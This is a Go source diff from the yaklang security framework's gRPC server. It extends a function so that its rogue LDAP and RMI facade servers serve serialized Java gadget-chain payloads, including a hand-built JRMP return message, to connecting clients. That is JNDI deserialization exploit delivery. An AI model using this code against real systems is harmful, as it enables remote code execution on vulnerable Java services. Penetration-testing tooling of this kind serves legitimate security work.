@@ -1,9 +1,13 @@
 package yakgrpc
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"github.com/yaklang/yaklang/common/yserx"
+	"github.com/yaklang/yaklang/common/yso"
 	"math/rand"
 	"net"
 	"os"
@@ -494,6 +498,10 @@ func (s *Server) ApplyClassToFacades(ctx context.Context, req *ypb.ApplyClassToF
 	if !ok {
 		return nil, utils.Errorf("Server is not exist for token: %s", token)
 	}
+	if req.GetGenerateClassParams() == nil {
+		return nil, errors.New("not set class params")
+	}
+	isClass := req.GetGenerateClassParams().GetGadget() == "None"
 	bytesRsp, err := s.GenerateYsoBytes(ctx, req.GetGenerateClassParams())
 	if err != nil {
 		return nil, utils.Errorf("generate class error: %v", err)
@@ -506,10 +514,35 @@ func (s *Server) ApplyClassToFacades(ctx context.Context, req *ypb.ApplyClassToF
 		return nil, utils.Error("facade server need class")
 	}
 	httpAddr := server.ReverseAddr
-	server.Config(
-		facades.SetHttpResource(classPath, bytesRsp.GetBytes()),
-		facades.SetLdapResourceAddr(className, httpAddr),
-		facades.SetRmiResourceAddr(className, httpAddr),
-	)
+	if isClass {
+		server.Config(
+			facades.SetHttpResource(classPath, bytesRsp.GetBytes()),
+			facades.SetLdapResourceAddr(className, httpAddr),
+			facades.SetRmiResourceAddr(className, httpAddr),
+		)
+	} else {
+		objIns, err := yso.GetJavaObjectFromBytes(bytesRsp.GetBytes())
+		if err != nil {
+			return nil, err
+		}
+		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshaler())
+		payloadBuf := bytes.Buffer{}
+		payloadBuf.WriteByte(0x51)                       // Return
+		payloadBuf.Write([]byte{0xac, 0xed, 0x00, 0x05}) // stream header
+		payloadBuf.Write([]byte{0x77, 0x0f})             // TC_BLOCKDATA Header,length: 0x0f
+		payloadBuf.WriteByte(0x01)                       //NormalReturn
+		payloadBuf.Write(yserx.IntTo4Bytes(0))           // unique
+		payloadBuf.Write(yserx.Uint64To8Bytes(0))        //time
+		payloadBuf.Write(yserx.IntTo2Bytes(0))           //count
+		payloadBuf.Write(payload[4:])
+		rmiPayload := payloadBuf.Bytes()
+		server.Config(
+			facades.SetLdapResponseEntry(className, map[string]any{
+				"javaSerializedData": bytesRsp.GetBytes(),
+				"javaClassName":      utils.RandStringBytes(5),
+			}),
+			facades.SetRmiResource(className, rmiPayload),
+		)
+	}
 	return &ypb.Empty{}, nil
 }
